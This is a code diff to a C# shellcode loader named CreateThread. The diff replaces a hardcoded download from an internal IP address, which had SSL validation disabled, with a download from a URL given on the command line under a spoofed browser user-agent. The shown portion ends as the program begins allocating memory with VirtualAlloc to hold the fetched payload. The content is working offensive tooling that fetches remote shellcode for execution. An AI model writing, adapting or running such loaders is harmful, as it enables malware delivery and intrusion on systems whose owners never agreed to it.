@@ -1,5 +1,6 @@
 ﻿using System;
-using System.Net.Http;
+using System.IO;
+using System.Net;
 using System.Runtime.InteropServices;
 using System.Threading.Tasks;
 
@@ -7,21 +8,20 @@ namespace CreateThread
 {
     internal class Program
     {
-        static async Task Main(string[] args)
+        static void Main(string[] args)
         {
             byte[] shellcode;
 
-            using (var handler = new HttpClientHandler())
+            if (args == null || args.Length == 0)
             {
-                // Ignore SSL
-                handler.ServerCertificateCustomValidationCallback = (message, cert, chain, sslPolicyErrors) => true;
-
-                using (var client = new HttpClient(handler))
-                {
-                    // Download the shellcode
-                    shellcode = await client.GetByteArrayAsync("http://172.16.189.250/shellcode.bin");
-                }
+                throw new ApplicationException("Specify the URL of the shellcode to retrieve.");
             }
+            var client = new WebClient();
+
+            // Add a user agent header in case the requested URI contains a query.
+            client.Headers.Add("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;)");
+
+            shellcode = client.DownloadData(args[0]);
 
             // Allocate a region of memory in this process as RW
             var baseAddress = Win32.VirtualAlloc(
